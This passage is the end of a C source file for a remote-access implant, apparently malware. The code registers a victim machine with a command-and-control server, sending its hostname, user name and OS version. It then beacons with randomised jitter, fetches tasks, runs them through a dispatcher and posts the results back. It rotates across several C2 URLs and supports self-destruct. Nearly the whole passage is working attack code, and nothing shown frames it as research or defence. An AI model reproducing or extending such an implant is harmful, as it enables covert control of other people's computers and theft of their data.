                  + ((double)rand() / (double)RAND_MAX) * 2.0 * JITTER_FACTOR;
    double secs = (double)beacon_interval * jitter;
    if (secs < 1.0) secs = 1.0;
    usleep((useconds_t)(secs * 1e6));
}

static int do_register(const char *base_url) {
    char hostname[256] = "unknown";
    gethostname(hostname, sizeof(hostname)-1);

    const char *user = getenv("USER");
    if (!user) user = getenv("LOGNAME");
    if (!user) { struct passwd *pw = getpwuid(getuid()); user = pw ? pw->pw_name : "unknown"; }

    struct utsname un; char os_str[256] = "Linux";
    if (uname(&un) == 0) snprintf(os_str, sizeof(os_str), "%s %s", un.sysname, un.release);

    char url[512];
    snprintf(url, sizeof(url), "%s/%s", base_url, SLUG_REG);

    char *hn = json_esc(hostname);
    char *eu = json_esc(user);
    char *eo = json_esc(os_str);
    char body[2048];
    snprintf(body, sizeof(body),
             "{\"id\":\"%s\",\"hostname\":\"%s\",\"user\":\"%s\",\"os\":\"%s\"}",
             IMPLANT_ID, hn, eu, eo);
    free(hn); free(eu); free(eo);

    char *resp = http_post(url, body);
    if (!resp) return 0;
    int ok = (strstr(resp, "\"ok\":true") != NULL);
    free(resp);
    return ok;
}

static void beacon_loop(void) {
    srand((unsigned)time(NULL) ^ (unsigned)getpid());
    curl_global_init(CURL_GLOBAL_DEFAULT);

    int registered = 0;

    while (1) {
        const char *base_url = C2_URLS[c2_index % C2_URL_COUNT];
        char url[512];

        /* ── Register ──────────────────────────────────────────────────── */
        if (!registered) {
            if (do_register(base_url)) {
                registered = 1;
                consecutive_fails = 0;
            } else {
                consecutive_fails++;
                if (C2_URL_COUNT > 1 && consecutive_fails >= MAX_FAILURES) {
                    c2_index++;
                    consecutive_fails = 0;
                }
                jitter_sleep();
            }
            continue;
        }

        /* ── Poll for tasks ────────────────────────────────────────────── */
        snprintf(url, sizeof(url), "%s/%s/%s", base_url, SLUG_TASK, IMPLANT_ID);
        long http_code = 0;
        char *resp = http_get_ex(url, &http_code);

        if (!resp) {
            consecutive_fails++;
            if (C2_URL_COUNT > 1 && consecutive_fails >= MAX_FAILURES) {
                c2_index++;
                consecutive_fails = 0;
                registered = 0;
            }
            jitter_sleep();
            continue;
        }

        if (http_code == 404) {
            /* Implant not found on C2 — re-register */
            free(resp);
            registered = 0;
            continue;
        }

        consecutive_fails = 0;

        char *task_json = json_obj(resp, "task");
        free(resp);

        if (task_json) {
            char *result = dispatch(task_json);
            free(task_json);

            if (result) {
                snprintf(url, sizeof(url), "%s/%s/%s", base_url, SLUG_RES, IMPLANT_ID);
                char *post_resp = http_post(url, result);
                free(result);
                free(post_resp);

                if (g_self_destruct) {
                    curl_global_cleanup();
                    exit(0);
                }
            }
        }

        jitter_sleep();
    }
}

// ── main ─────────────────────────────────────────────────────────────────────

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    signal(SIGPIPE, SIG_IGN);   /* prevent crash on broken TLS pipe */

    uuid_gen(IMPLANT_ID);
    derive_endpoints();
    beacon_loop();
    return 0;
}
